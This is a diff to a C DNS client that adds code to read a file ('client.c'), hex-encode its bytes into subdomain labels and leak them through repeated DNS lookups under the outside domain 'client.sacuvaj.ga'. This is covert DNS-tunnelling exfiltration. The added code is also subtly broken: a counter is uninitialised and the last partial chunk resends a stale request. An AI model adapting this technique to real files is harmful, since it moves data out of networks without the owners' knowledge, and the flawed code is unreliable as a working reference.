@@ -6,6 +6,10 @@
  
 char dns_servers[10][100];
 int dns_server_count = 0;
+
+#define BUFFER_SIZE 256
+
+unsigned char buffer[BUFFER_SIZE];
  
 #define T_A 1 //Ipv4 address
 
@@ -58,11 +62,44 @@ typedef struct
  
 int main( int argc , char *argv[])
 {
-    unsigned char hostname[100] = "aaaa.sacuvaj.ga";
- 
+    unsigned char hostname[100] = "client.sacuvaj.ga";
+
+
+
     get_dns_servers();
 
-    ngethostbyname(hostname , T_A);
+    char request[100];
+
+    char url[61];
+
+
+	FILE * file_ptr = fopen ("client.c", "r");
+
+	int counter;
+
+	size_t bytes_read = 0;
+
+	int i;
+
+	while(bytes_read = fread(buffer, sizeof(unsigned char), BUFFER_SIZE, file_ptr)){
+		for(i = 0; i < bytes_read; i++){
+			sprintf(&url[counter%30*2], "%02X", buffer[i]);
+
+			printf("%c", buffer[i]);
+
+			if(counter%30 == 29){
+				sprintf(request, "%s.%s", url, hostname);
+				ngethostbyname(request , T_A);
+				usleep(1000000);
+			}
+
+			counter++;
+		}
+	}
+
+	if(counter%30 != 0){
+		ngethostbyname(request , T_A);
+	}
  
     return 0;
 }
